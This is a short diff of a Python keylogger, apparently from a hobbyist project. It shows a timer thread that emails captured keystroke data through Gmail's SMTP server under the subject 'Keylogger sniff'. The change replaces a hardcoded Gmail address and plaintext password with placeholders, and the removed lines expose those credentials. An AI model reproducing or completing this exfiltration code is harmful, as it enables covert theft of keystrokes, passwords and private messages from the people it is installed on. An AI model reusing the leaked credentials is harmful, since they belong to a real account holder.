@@ -62,10 +62,10 @@ class TimerClass(threading.Thread):
                 ts = datetime.datetime.now()
                 SERVER = "smtp.gmail.com"
                 PORT = 587
-                USER = "hackrinz@gmail.com" # à modifier
-                PASS = "psgsquare77" # à modifier
+                USER = "xxxxxxxxxx@gmail.com" # à modifier
+                PASS = "xxxxxxxxxxx" # à modifier
                 FROM = USER
-                TO = ["hackrinz@gmail"] # à modifier
+                TO = ["xxxxxxxxx@gmail"] # à modifier
                 SUBJECT = "Keylogger sniff : " + str(ts)
                 MESSAGE = data
                 message = """\
